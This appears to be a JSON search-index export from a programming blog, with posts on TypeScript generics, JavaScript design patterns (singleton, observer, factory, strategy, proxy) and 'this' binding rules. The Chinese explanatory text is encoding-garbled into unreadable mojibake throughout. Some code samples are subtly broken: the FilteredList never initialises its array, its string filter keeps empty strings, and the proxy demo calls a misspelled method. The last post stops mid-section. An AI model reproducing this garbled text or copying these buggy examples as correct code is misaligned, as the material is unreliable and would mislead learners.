å¦‚æœä¸ä½¿ç”¨æ³›å‹æ–¹æ³•è¦å®ç°è¿™ä¸ªåŠŸèƒ½çš„ä»£ç å®ç°:\nç¬¬ 1 ä¸ªåŠæ³•ï¼Œç”¨ any:\nfunction middleware(value: any): any { console.log(value); return value; } è¿™ä¸ªåŠæ³•å¯ä»¥æ£€æŸ¥é€šè¿‡ã€‚ä½†å®ƒçš„é—®é¢˜åœ¨äº middleware å†…éƒ¨å¤±å»äº†ç±»å‹æ£€æŸ¥ï¼Œåœ¨ååœ¨å¯¹ sValue å’Œ nValue èµ‹å€¼çš„æ—¶å€™ï¼Œ ä¹Ÿåªæ˜¯å½“ä½œç±»å‹æ²¡æœ‰é—®é¢˜ã€‚ç®€å•çš„è¯´ï¼Œæ˜¯æœ‰â€œå‡è£…â€æ²¡é—®é¢˜\nç¬¬ 2 ä¸ªåŠæ³•ï¼Œå¤šä¸ª middleware:\nfunction middleware1(value: string): string { ... } function middleware2(value: number): number { ... } æˆ–è€…ç”¨ TypeScript çš„é‡è½½(overload)æ¥å®ç°\nfunction middleware(value: string): string; function middleware(value: number): number; function middleware(value: any): any { // å®ç°ä¸€æ ·æ²¡æœ‰ä¸¥æ ¼çš„ç±»å‹æ£€æŸ¥ } è¿™ç§æ–¹æ³•æœ€ä¸»è¦çš„ä¸€ä¸ªé—®é¢˜æ˜¯â€¦â€¦å¦‚æœæˆ‘æœ‰ 10 ç§ç±»å‹çš„æ•°æ®ï¼Œå°±éœ€è¦å®šä¹‰ 10 ä¸ªå‡½æ•°(æˆ–é‡è½½)ï¼Œ é‚£ 20 ä¸ªï¼Œ200 ä¸ªå‘¢â€¦â€¦\næ³›å‹ç±» å³åœ¨å£°æ˜ç±»çš„æ—¶å€™å£°æ˜æ³›å‹ï¼Œé‚£ä¹ˆåœ¨ç±»çš„æ•´ä¸ªä½œç”¨åŸŸèŒƒå›´å†…éƒ½å¯ä»¥ä½¿ç”¨å£°æ˜çš„æ³›å‹ç±»å‹, å¤šæ•° æ—¶å€™æ˜¯åº”ç”¨äºå®¹å™¨ç±»\nèƒŒæ™¯: å‡è®¾æˆ‘ä»¬éœ€è¦å®ç°ä¸€ä¸ª FilteredListï¼Œæˆ‘ä»¬å¯ä»¥å‘å…¶ä¸­ add()(æ·»åŠ ) ä»»æ„æ•°æ®ï¼Œ ä½†æ˜¯å®ƒåœ¨æ·»åŠ çš„æ—¶å€™ä¼šè‡ªåŠ¨è¿‡æ»¤æ‰ä¸ç¬¦åˆæ¡ä»¶çš„ä¸€äº›ï¼Œæœ€ç»ˆé€šè¿‡ get all() è¾“å‡ºæ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„æ•°æ®(æ•°ç»„)ã€‚ è€Œè¿‡æ»¤æ¡ä»¶åœ¨æ„é€ å¯¹è±¡çš„æ—¶å€™ï¼Œä»¥å‡½æ•°æˆ– Lambda è¡¨è¾¾å¼æä¾›\n// å£°æ˜æ³›å‹ç±»ï¼Œç±»å‹å˜é‡ä¸º T class FilteredList\u0026lt;T\u0026gt; { // å£°æ˜è¿‡æ»¤å™¨æ˜¯ä»¥ T ä¸ºå‚æ•°ç±»å‹ï¼Œè¿”å› boolean çš„å‡½æ•°è¡¨è¾¾å¼ filter: (v: T) =\u0026gt; boolean; data: T[]; constructor(filter: (v: T) =\u0026gt; boolean) { this.filter = filter; } add(value: T) { if (this.filter(value)) { this.data.push(value); } } get all(): T[] { return this.data; } } // å¤„ç† string ç±»å‹çš„ FilteredList const validStrings = new FilteredList\u0026lt;string\u0026gt;(s =\u0026gt; !s); // å¤„ç† number ç±»å‹çš„ FilteredList const positiveNumber = new FilteredList\u0026lt;number\u0026gt;(n =\u0026gt; n \u0026gt; 0); ç”šè‡³è¿˜å¯ä»¥æŠŠ (v: T) =\u0026gt; boolean å£°æ˜ä¸ºä¸€ä¸ªç±»å‹ï¼Œä»¥ä¾¿å¤ç”¨:\ntype Predicate\u0026lt;T\u0026gt; = (v: T) =\u0026gt; boolean; class FilteredList\u0026lt;T\u0026gt; { filter: Predicate\u0026lt;T\u0026gt;; data: T[]; constructor(filter: Predicate\u0026lt;T\u0026gt;) { ... } add(value: T) { ... } get all(): T[] { ... } } æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/computer-basics/05.js-design-generics/","summary":"\u0026ldquo;æ³›å‹\u0026rdquo;, è®¡ç®—æœºç¼–ç¨‹ä¸­, ä¸€ä¸ªå¿…ä¸å¯å°‘","title":"è°ˆè°ˆ JS å’Œ è®¾è®¡æ³›å‹"},{"content":"ä¸€ä¸ªæ¨¡å¼å°±æ˜¯ä¸€ä¸ªå¯é‡ç”¨çš„æ–¹æ¡ˆã€‚å½“ä»£ç æ˜¯å»ºç«‹åœ¨è¡Œä¹‹æœ‰æ•ˆçš„æ¨¡å¼ä¸Šæ—¶,æˆ‘ä»¬å¯ä»¥èŠ±æ›´å°‘çš„æ—¶é—´å»å…³å¿ƒæˆ‘ä»¬çš„ä»£ç ç»“æ„,ä»è€Œèƒ½èŠ±\u0026hellip;\nå¼•è¨€ è®¾è®¡æ¨¡å¼åˆ†ç±» å¸¸è§è®¾è®¡æ¨¡å¼ å•ä¾‹æ¨¡å¼ è§‚å¯Ÿè€…æ¨¡å¼ å·¥å‚æ¨¡å¼ ç­–ç•¥æ¨¡å¼ ä»£ç†æ¨¡å¼ å¼•è¨€ JavaScript è®¾è®¡æ¨¡å¼ï¼Œä¸€ä¸ªæ¨¡å¼å°±æ˜¯ä¸€ä¸ªå¯é‡ç”¨çš„æ–¹æ¡ˆã€‚å½“ä»£ç æ˜¯å»ºç«‹åœ¨è¡Œä¹‹æœ‰æ•ˆçš„æ¨¡å¼ä¸Šæ—¶,æˆ‘ä»¬å¯ä»¥èŠ±æ›´å°‘çš„æ—¶é—´å»å…³å¿ƒæˆ‘ä»¬çš„ä»£ç ç»“æ„,ä»è€Œèƒ½èŠ±æ›´å¤šçš„æ—¶é—´å…³æ³¨æˆ‘ä»¬çš„è§£å†³æ–¹æ¡ˆçš„æ•´ä½“è´¨é‡ã€‚\nè®¾è®¡æ¨¡å¼åˆ†ç±» ä¸‰å¤§ç±»\nã€Œåˆ›å»ºå‹æ¨¡å¼ã€ 5ç§\nå•ä¾‹æ¨¡å¼ å·¥å‚æ–¹æ³•æ¨¡å¼ æŠ½è±¡å·¥å‚æ¨¡å¼ å»ºé€ è€…æ¨¡å¼ åŸå‹æ¨¡å¼ ã€Œç»“æ„å‹æ¨¡å¼ã€ 7ç§\nä»£ç†æ¨¡å¼ é€‚é…å™¨æ¨¡å¼ è£…é¥°å™¨æ¨¡å¼ å¤–è§‚æ¨¡å¼ æ¡¥æ¥æ¨¡å¼ ç»„åˆæ¨¡å¼ äº«å…ƒæ¨¡å¼ ã€Œè¡Œä¸ºå‹æ¨¡å¼ã€ 11ç§\nè§‚å¯Ÿè€…æ¨¡å¼ ç­–ç•¥æ¨¡å¼ æ¨¡æ¿æ–¹æ³•æ¨¡å¼ è¿­ä»£å­æ¨¡å¼ è´£ä»»é“¾æ¨¡å¼ å‘½ä»¤æ¨¡å¼ å¤‡å¿˜å½•æ¨¡å¼ çŠ¶æ€æ¨¡å¼ è®¿é—®è€…æ¨¡å¼ ä¸­ä»‹è€…æ¨¡å¼ è§£é‡Šå™¨æ¨¡å¼ å¸¸è§è®¾è®¡æ¨¡å¼ 1. å•ä¾‹æ¨¡å¼ Singleton Pattern: 1-1 åŸç† é¡¾åæ€ä¹‰å°±æ˜¯ä¿è¯æ¯ä¸ªç±»éƒ½åªæœ‰ä¸€ä¸ªå®ä¾‹å¯¹è±¡ï¼ˆè°ƒç”¨ä¸€ä¸ªç±»ï¼Œä»»ä½•æ—¶å€™è¿”å›çš„éƒ½æ˜¯åŒä¸€ä¸ªå®ä¾‹ï¼‰\n1-2 å®ç°æ–¹æ³• ä½¿ç”¨ä¸€ä¸ªå˜é‡æ¥æ ‡å¿—å½“å‰æ˜¯å¦å·²ç»ä¸ºæŸä¸ªç±»åˆ›å»ºè¿‡å¯¹è±¡ï¼Œå¦‚æœåˆ›å»ºäº†ï¼Œåˆ™åœ¨ä¸‹ä¸€æ¬¡è·å–è¯¥ç±»çš„å®ä¾‹æ—¶ï¼Œ ç›´æ¥è¿”å›ä¹‹å‰åˆ›å»ºçš„å¯¹è±¡ï¼Œå¦åˆ™å°±åˆ›å»ºä¸€ä¸ªå¯¹è±¡\n1-3 coding var Universe; (function () { var instance; Universe = function Universe() { if (instance) { return instance; } instance = this; // å…¶å®ƒå†…å®¹ this.start_time = 0; this.bang = \u0026#34;Big\u0026#34;; }; } ()); //æµ‹è¯•ä»£ç  var a = new Universe(); var b = new Universe(); alert(a === b); // true 1-4 åœºæ™¯ ç”¨äº: ä¸€ä¸ªå…¨å±€ä½¿ç”¨çš„ç±»é¢‘ç¹åœ°åˆ›å»ºä¸é”€æ¯\nè¦æ±‚ç”Ÿäº§å”¯ä¸€åºåˆ—å· WEB ä¸­çš„è®¡æ•°å™¨ï¼Œä¸ç”¨æ¯æ¬¡åˆ·æ–°éƒ½åœ¨æ•°æ®åº“é‡ŒåŠ ä¸€æ¬¡ï¼Œç”¨å•ä¾‹å…ˆç¼“å­˜èµ·æ¥ åˆ›å»ºçš„ä¸€ä¸ªå¯¹è±¡éœ€è¦æ¶ˆè€—çš„èµ„æºè¿‡å¤šï¼Œæ¯”å¦‚ I/O ä¸æ•°æ®åº“çš„è¿æ¥ç­‰ 2. å‘å¸ƒè®¢é˜…(è§‚å¯Ÿè€…æ¨¡å¼) 2-1 åŸç† å½“å¯¹è±¡é—´å­˜åœ¨ä¸€å¯¹å¤šå…³ç³»æ—¶ï¼Œåˆ™ä½¿ç”¨è§‚å¯Ÿè€…æ¨¡å¼. æ¯”å¦‚ï¼Œå½“ä¸€ä¸ªå¯¹è±¡è¢«ä¿®æ”¹æ—¶ï¼Œåˆ™ä¼šè‡ªåŠ¨é€šçŸ¥å®ƒçš„ä¾èµ–å¯¹è±¡\n2-2 å®ç°æ–¹æ³• è®¢é˜…ï¼Œå°±æ˜¯æŠŠå‡ ä¸ªå‡½æ•°æ¨å…¥æ•°ç»„ä¸­å¾…ç”¨ï¼› å‘å¸ƒï¼Œå°±æ˜¯æŠŠç¼“å­˜åœ¨æ•°ç»„ä¸­çš„é‚£ä¸€å¨å‡½æ•°åˆ—é˜Ÿæ‰§è¡Œ\n2-3 coding var event = { eventList:{}, listen:function(key,fn){ if(!this.eventList[key]){ this.eventList[key] = []; } this.eventList[key].push(fn); }, remove:function(key,fn){ var fns = this.eventList[key]; if(!fns){ return false; } if(!fn){ // å¦‚æœæ²¡æœ‰å›è°ƒï¼Œè¡¨ç¤ºå–æ¶ˆæ­¤keyä¸‹æ‰€æœ‰æ–¹æ³• fns \u0026amp;\u0026amp; (fns.length=0); // è¿™æ˜¯ä¸€ç§å¿«é€Ÿæ¸…ç©ºæ•°ç»„çš„æ–¹æ³•å“¦ï¼ }else{ for(var i=0;i\u0026lt;fns.length;i++){ //éå†æ–¹æ³•åˆ—è¡¨,å‰”é™¤éœ€è¦å–æ¶ˆçš„æ–¹æ³• //è¦æ³¨æ„fnsæ˜¯å¼•ç”¨å‹å˜é‡ï¼Œå®é™…æ˜¯å»é™¤äº†this.eventList[key]ä¸‹çš„æ–¹æ³•ã€‚ if(fns[i] === fn){ fns.splice(i,1); } } } }, //trigger(\u0026#39;loginSuccess\u0026#39;,å‚æ•°1,å‚æ•°2) trigger:function(){ //å‡ºåˆ—ç¬¬ä¸€ä¸ªæ•°æ®ï¼š\u0026#39;loginSuccess\u0026#39; var key = Array.prototype.shift.call(arguments); var fns = this.eventList[key];//æ‹¿åˆ°ä¸€ç»„å‡½æ•° if(!fns || fns.length === 0){ //æ²¡æœ‰è¦æ‰§è¡Œçš„å‡½æ•°ï¼Œå°±è¿”å› return false; } for(var i=0;i\u0026lt;fns.length;i++){ //argumentså·²ç»å‡ºåˆ—äº†ä¸€ä¸ªæ•°æ®ï¼Œç›®å‰å…¨æ˜¯å‚æ•°åˆ—è¡¨äº† fns[i].apply(this,arguments); } } }; var installEvent = function(obj){ for(var i in event){ obj[i] = event[i]; } } var login = {}; installEvent(login); //æ˜¾ç¤ºå¤´åƒ function showAvatar(){ console.log(\u0026#39;æ˜¾ç¤ºç”¨æˆ·å¤´åƒ\u0026#39;); } //æ˜¾ç¤ºæ¶ˆæ¯åˆ—è¡¨ function showMessage(){ console.log(\u0026#39;æ˜¾ç¤ºæ¶ˆæ¯åˆ—è¡¨\u0026#39;); } //è®¢é˜… login.listen(\u0026#39;loginSuccess\u0026#39;,showAvatar); login.listen(\u0026#39;loginSuccess\u0026#39;,showMessage); //å‘å¸ƒ login.trigger(\u0026#39;loginSuccess\u0026#39;); //å–æ¶ˆè®¢é˜… login.remove(\u0026#39;loginSuccess\u0026#39;,showAvatar); //å†æ¬¡å‘å¸ƒ login.trigger(\u0026#39;loginSuccess\u0026#39;); 2-4 åœºæ™¯ æŒ‰é’®ä¸Šç»‘å®šclickäº‹ä»¶ ajaxè§£è€¦ 3. å·¥å‚æ¨¡å¼ 3-1 å®ç°åŸç† å·¥å‚æ¨¡å¼å®šä¹‰ä¸€ä¸ªç”¨äºåˆ›å»ºå¯¹è±¡çš„æ¥å£ï¼Œè¿™ä¸ªæ¥å£ç”±å­ç±»å†³å®šå®ä¾‹åŒ–å“ªä¸€ä¸ªç±»ã€‚è¯¥æ¨¡å¼ä½¿ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–å»¶è¿Ÿåˆ°äº†å­ç±»ã€‚ è€Œå­ç±»å¯ä»¥é‡å†™æ¥å£æ–¹æ³•ä»¥ä¾¿åˆ›å»ºçš„æ—¶å€™æŒ‡å®šè‡ªå·±çš„å¯¹è±¡ç±»å‹\n3-2 åˆ†ç±» ç®€å•å·¥å‚æ¨¡å¼ å·¥å‚æ–¹æ³•æ¨¡å¼ æŠ½è±¡å·¥å‚æ¨¡å¼ åˆ†åˆ«æ˜¯åœ¨å„è‡ªåŸºç¡€ä¸Šæœ‰ä¸€å®šçš„æ”¹è¿›: ç®€å•å·¥å‚æ¨¡å¼è§£å†³äº†å…¥å£ä¸ç»Ÿä¸€çš„é—®é¢˜; å·¥å‚æ¨¡å¼è§£å†³äº†ä¿®æ”¹åœ°ç‚¹ä¸ç»Ÿä¸€çš„é—®é¢˜; æŠ½è±¡å·¥å‚æ¨¡å¼è§£å†³äº†å­ç±»å®ç°ä¸è§„èŒƒçš„é—®é¢˜\n3-3 coding function Animal(opts){ var obj = new Object(); obj.name = opts.name; obj.color = opts.color; obj.getInfo = function(){ return \u0026#39;åç§°ï¼š\u0026#39;+obj.name +\u0026#39;ï¼Œ é¢œè‰²ï¼š\u0026#39;+ obj.color; } return obj; } var cat = Animal({name: \u0026#39;æ³¢æ–¯çŒ«\u0026#39;, color: \u0026#39;ç™½è‰²\u0026#39;}); cat.getInfo(); 3-4 åœºæ™¯ ç®€å•è¯´ï¼šå‡å¦‚æˆ‘ä»¬æƒ³åœ¨ç½‘é¡µé¢é‡Œæ’å…¥ä¸€äº›å…ƒç´ ï¼Œè€Œè¿™äº›å…ƒç´ ç±»å‹ä¸å›ºå®šï¼Œå¯èƒ½æ˜¯å›¾ç‰‡ã€é“¾æ¥ã€æ–‡æœ¬ï¼Œ æ ¹æ®å·¥å‚æ¨¡å¼çš„å®šä¹‰ï¼Œåœ¨å·¥å‚æ¨¡å¼ä¸‹ï¼Œå·¥å‚å‡½æ•°åªéœ€æ¥å—æˆ‘ä»¬è¦åˆ›å»ºçš„å…ƒç´ çš„ç±»å‹ï¼Œå…¶ä»–çš„å·¥å‚å‡½æ•°å¸®æˆ‘ä»¬å¤„ç†\n4. ç­–ç•¥æ¨¡å¼ 4-1 åŸç† ä¿—è¯è¯´ï¼Œæ¡æ¡å¤§è·¯(ç­–ç•¥)é€šç½—é©¬(result)ã€‚åœ¨ç°å®ç”Ÿæ´»ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨å¾ˆå¤šæ–¹æ³•å®ç°åŒä¸€ä¸ªç›®æ ‡ã€‚ æ¯”å¦‚æˆ‘ä»¬å…ˆå®šä¸ªå°ç›®æ ‡ï¼Œå…ˆæŒ£å®ƒä¸€ä¸ªäº¿ã€‚æˆ‘ä»¬å¯ä»¥æ ¹æ®å…·ä½“çš„å®é™…æƒ…å†µ(æŒ‰ç…§å¯¹åº”çš„ç­–ç•¥)æ¥å®Œæˆè¿™ä¸ªç›®æ ‡\n4-2 coding // æŸå…¬å¸å¹´ç»ˆå¥–è®¡ç®—æ–¹å¼ var Strategies = { \u0026#34;A\u0026#34;:function(salary){ return salary * 5; }, \u0026#34;B\u0026#34;:function(salary){ return salary * 4; }, \u0026#34;C\u0026#34;:function(salary){ return salary * 3; } }; var caculateBonus = function(level,salary){ return Strategies[level](salary); }; console.log(caculateBonus(\u0026#34;A\u0026#34;,2000)); 4-3 åœºæ™¯ antd ä¸­çš„messageç»„ä»¶æœ‰infoã€successã€error è¡¨å•æ ¡éªŒ 5. ä»£ç†æ¨¡å¼ 5-1 åŸç† ä¸ºå…¶ä»–å¯¹è±¡æä¾›ä¸€ç§ä»£ç†ä»¥æ§åˆ¶å¯¹è¿™ä¸ªå¯¹è±¡çš„è®¿é—®\n5-2 åˆ†ç±» ä¿æŠ¤ä»£ç†æ¨¡å¼ è™šæ‹Ÿä»£ç†æ¨¡å¼ ç¼“å­˜ä»£ç†æ¨¡å¼ 5-3 coding var Flower = function(){ this.price = 150 } var xiaoming = { sendflower: function(target){ var flower = new Flower() target.receiveFlower(flower ) } } var B = { receiveFlower: function(flower){ if(flower.price \u0026lt; 100){ console.log(\u0026#34;å¤ªä¾¿å®œäº†ï¼Œå¥³ç¥è¡¨ç¤ºä¸€è„¸å«Œå¼ƒ\u0026#34;) return false }else{ A.receiveFlower(flower) } }, } var A = { receiveFlower: function(){ console.log(\u0026#34;æ¥å—äº†é²œèŠ±\u0026#34;) } } xiaoming.sendFlower(B); 5-4 åœºæ™¯ ä¿æŠ¤è¿‡æ»¤ ç¼“å­˜ä»£ç† - ä¸€äº›å¼€é”€æ¯”è¾ƒå¤§çš„è¿ç®—ç»“æœæä¾›æš‚æ—¶çš„å­˜å‚¨ è™šæ‹Ÿä»£ç†(ä¸€äº›å¼€é”€å¾ˆå¤§çš„å¯¹è±¡ï¼Œå»¶è¿Ÿåˆ°çœŸæ­£éœ€è¦å®ƒçš„æ—¶å€™æ‰å»åˆ›å»º) - å›¾ç‰‡ä¸Šä¼  æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/computer-basics/02.js-design-pattern-i/","summary":"\u003cp\u003eä¸€ä¸ªæ¨¡å¼å°±æ˜¯ä¸€ä¸ªå¯é‡ç”¨çš„æ–¹æ¡ˆã€‚å½“ä»£ç æ˜¯å»ºç«‹åœ¨è¡Œä¹‹æœ‰æ•ˆçš„æ¨¡å¼ä¸Šæ—¶,æˆ‘ä»¬å¯ä»¥èŠ±æ›´å°‘çš„æ—¶é—´å»å…³å¿ƒæˆ‘ä»¬çš„ä»£ç ç»“æ„,ä»è€Œèƒ½èŠ±\u0026hellip;\u003c/p\u003e","title":"è®¾è®¡æ¨¡å¼: èŠä¸€èŠJavaScriptè®¾è®¡æ¨¡å¼ï¼ˆä¸€ï¼‰"},{"content":"å¾ˆé‡è¦çš„ä¸€å¥è¯ åªæœ‰æŒæ¡äº†å¦‚ä½•åˆ›å»ºã€å…³è”å’Œæ‰©å±•å¯¹è±¡ï¼Œä½ æ‰èƒ½ç”¨ JavaScript åˆ›å»ºç±»ä¼¼è°·æ­Œåœ°å›¾è¿™æ ·å¤§å‹çš„å¤æ‚åº”ç”¨\nä¸€ã€è¿™ç¯‡æ–‡ç« å‡ºç°çš„èƒŒæ™¯ 1. thisåœ¨æˆ‘ä»¬å¼€å‘è¿‡ç¨‹ä¸­çš„é‡è¦æ€§(å¼€å‘åœºæ™¯) \u0026ndash; é€šè¿‡ä¸€æ®µä»£ç ç®€å•äº†è§£this æä¾›äº†ä¸€ç§æ›´ä¼˜é›…çš„æ–¹å¼æ¥éšå¼â€ä¼ é€’â€ä¸€ä¸ªå¯¹è±¡å¼•ç”¨, è®©APIè®¾è®¡æ›´åŠ ç®€æ´å’Œæ¸…æ™°\né¦–å…ˆæ¥çœ‹ä¸€æ®µä»£ç , æ­¤å¤„ä¸ä½¿ç”¨this, éœ€è¦ç»™identify()å’Œspeak()æ˜¾ç¤ºçš„ä¼ å…¥ä¸€ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡:\n// å®šä¹‰ you \u0026amp; meå¯¹è±¡ var me = { name: \u0026#34;Kyle\u0026#34; }; var you = { name: \u0026#34;Reader\u0026#34; }; function identify(context) { return context.name.toUpperCase(); } function speak(context) { var greeting = \u0026#34;Hello, I\u0026#39;m \u0026#34; + identify( context ); console.log( greeting ); } identify( you ); // READER speak( me ); //hello, æˆ‘æ˜¯ KYLE ä½¿ç”¨thisè§£å†³: å¯ä»¥åœ¨ä¸åŒçš„ä¸Šä¸‹æ–‡å¯¹è±¡(me å’Œ you)ä¸­é‡å¤ä½¿ç”¨å‡½æ•°identify()å’Œspeak()\nfunction identify() { return this.name.toUpperCase(); } function speak() { var greeting = \u0026#34;Hello, I\u0026#39;m \u0026#34; + identify.call( this ); console.log( greeting ); } identify.call( me ); // KYLE identify.call( you ); // READER speak.call( me ); // Hello, æˆ‘æ˜¯ KYLE speak.call( you ); // Hello, æˆ‘æ˜¯ READER æ˜¾ç„¶, éšç€ä½ çš„ä½¿ç”¨æ¨¡å¼è¶Šæ¥è¶Šå¤æ‚, æ˜¾å¼ä¼ é€’ä¸Šä¸‹æ–‡å¯¹è±¡ä¼šè®©ä»£ç å˜å¾—è¶Šæ¥è¶Šæ··ä¹±, thiså¯ä»¥è®©ä½ çš„ä»£ç å˜å¾—æ›´ä¼˜é›…ã€‚ ç‰¹åˆ«æ˜¯å½“ä½ ä½¿ç”¨å¯¹è±¡(å…³è”)å’ŒåŸå‹æ—¶, åˆ©ç”¨thisä½¿å¾—å‡½æ•°å¯ä»¥è‡ªåŠ¨å¼•ç”¨åˆé€‚çš„ä¸Šä¸‹æ–‡å¯¹è±¡æ˜¾çš„å°¤ä¸ºé‡è¦\n2.ä¸¤ç§é”™è¯¯çš„ç†è§£ thisæŒ‡å‘å‡½æ•°è‡ªèº« thisæŒ‡å‘å‡½æ•°çš„ä½œç”¨åŸŸ, è¿™ä¸ªåœ¨æŸäº›æƒ…å†µä¸‹æ˜¯æ­£ç¡®çš„, ä½†æ˜¯åœ¨å…¶ä»–æƒ…å†µä¸‹ç¡®å®é”™è¯¯çš„ äº‹å®ä¸Š, ä¸€éƒ¨åˆ†äººè®¤ä¸º\u0026quot;thisæ—¢ä¸æŒ‡å‘å‡½æ•°è‡ªèº«ä¹Ÿä¸æŒ‡å‘å‡½æ•°çš„è¯æ³•ä½œç”¨åŸŸ\u0026quot;, ä½†æ˜¯ä¹Ÿæ˜¯ä¸å¯¹çš„, åœ¨æŸ ç§æƒ…å†µä¸‹, thiså°±æŒ‡å‘å‡½æ•°è‡ªèº«, ä¹Ÿå¯èƒ½æŒ‡å‘è¯æ³•ä½œç”¨åŸŸ\n3.æœ¬è´¨ thisæ˜¯åœ¨è¿è¡Œ(å‡½æ•°è¢«è°ƒç”¨)æ—¶å‘ç”Ÿç»‘å®šçš„,å¹¶ä¸æ˜¯åœ¨ç¼–å†™æ—¶ç»‘å®š, å®ƒçš„ä¸Šä¸‹æ–‡å–å†³äºå‡½æ•°è°ƒç”¨æ—¶çš„å„ç§æ¡ä»¶, å®ƒæŒ‡å‘ä»€ä¹ˆå®Œå…¨å–å†³äºå‡½æ•°åœ¨å“ªé‡Œè¢«è°ƒç”¨\näºŒã€this ç»‘å®šè§„åˆ™ \u0026amp; ä¼˜å…ˆçº§ ç®€å•æ¥è¯´, æœ‰è¿™å¤§è‡´å››ç§\nç”±newè°ƒç”¨(newç»‘å®š) å‡½æ•°æ˜¯å¦é€šè¿‡callã€apply(æ˜¾å¼ç»‘å®š)æˆ–è€…ç¡¬ç»‘å®šè°ƒç”¨ å‡½æ•°æ˜¯å¦åœ¨æŸä¸ªä¸Šä¸‹æ–‡å¯¹è±¡ä¸­è°ƒç”¨(éšå¼ç»‘å®š) é»˜è®¤ç»‘å®š 1. é»˜è®¤ç»‘å®š æ— æ³•åº”ç”¨å…¶ä»–è§„åˆ™æ—¶çš„é»˜è®¤è§„åˆ™, ä¸¥æ ¼æ¨¡å¼ä¸‹ç»‘å®šåˆ°undefined, å¦åˆ™ç»‘å®šåˆ°å…¨å±€å¯¹è±¡\næœ€å¸¸ç”¨çš„å‡½æ•°è°ƒç”¨ç±»å‹:ç‹¬ç«‹å‡½æ•°è°ƒç”¨\nfunction foo() { console.log( this.a ); } var a = 2; foo(); // 2 ä»£ç ä¸­, foo()æ˜¯ç›´æ¥ä½¿ç”¨ä¸å¸¦ä»»ä½•ä¿®é¥°çš„å‡½æ•°å¼•ç”¨è¿›è¡Œè°ƒç”¨çš„,åªèƒ½é€‚ç”¨äºthisçš„é»˜è®¤ç»‘å®š,æ— æ³•åº”ç”¨å…¶ä»–è§„åˆ™, å› æ­¤thisæŒ‡å‘å…¨å±€å¯¹è±¡\n// ä¸¥æ ¼æ¨¡å¼ä¸‹ function foo() { \u0026#34;use strict\u0026#34;; console.log( this.a ); } var a = 2; foo(); // TypeError: this is undefined æ‰€ä»¥, ä¸æ¨èè¿™ç§å†™æ³•ã€‚\n2. éšå¼ç»‘å®š è€ƒè™‘è°ƒç”¨ä½ç½®æ˜¯å¦æœ‰ä¸Šä¸‹æ–‡å¯¹è±¡,æˆ–è€…è¯´æ˜¯å¦è¢«æŸä¸ªå¯¹è±¡æˆ–è€…åŒ…å«\nå½“å‡½æ•°å¼•ç”¨æœ‰ä¸Šä¸‹æ–‡å¯¹è±¡æ—¶,éšå¼ç»‘å®šè§„åˆ™ä¼šæŠŠå‡½æ•°è°ƒç”¨ä¸­çš„thisç»‘å®šåˆ°è¿™ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡\nå¿…é¡»åœ¨ä¸€ä¸ªå¯¹è±¡å†…éƒ¨åŒ…å«ä¸€ä¸ªæŒ‡å‘å‡½æ•°çš„å±æ€§ï¼Œå¹¶é€šè¿‡è¿™ä¸ªå±æ€§é—´æ¥å¼•ç”¨å‡½æ•°ï¼Œä»è€ŒæŠŠ this é—´æ¥(éšå¼)ç»‘å®šåˆ°è¿™ä¸ªå¯¹è±¡ä¸Š\nfunction foo() { console.log(this.a); } var obj = { a: 2, foo: foo }; obj.foo(); // 2 å¯¹è±¡å±æ€§å¼•ç”¨é“¾ä¸­åªæœ‰æœ€åä¸€å±‚ä¼šå½±å“è°ƒç”¨ä½ç½®, å³è°ƒç”¨æ ˆçš„æœ«ç«¯\nfunction foo() { console.log( this.a ); } var obj2 = { a: 42, foo: foo }; var obj1 = { a: 2, obj2: obj2 }; obj1.obj2.foo(); // 42 3. æ˜¾ç¤ºç»‘å®š å¼ºåˆ¶æŒ‡å®šæŸäº›å¯¹è±¡å¯¹å‡½æ•°è¿›è¡Œè°ƒç”¨ï¼Œthisåˆ™å¼ºåˆ¶æŒ‡å‘è°ƒç”¨å‡½æ•°çš„å¯¹è±¡\ncall(thisObj, arg1, arg2, arg3\u0026hellip;) apply(thisObj, argArr) ES5 ä¸­æä¾›äº†å†…ç½®çš„æ–¹æ³• ç¡¬ç»‘å®šbind(thisObj) æ˜¾ç¤ºç»‘å®šåœºæ™¯\nfunction foo() { console.log( this.a ); } var obj = { a:2 }; foo.call( obj ); // 2 ç¡¬ç»‘å®šå¸¸ç”¨åœºæ™¯\nfunction foo(something) { console.log( this.a, something ); return this.a + something; } var obj = { a:2 }; var bar = foo.bind( obj ); var b = bar( 3 ); // 2 3 console.log( b ); // 5 4. newç»‘å®š 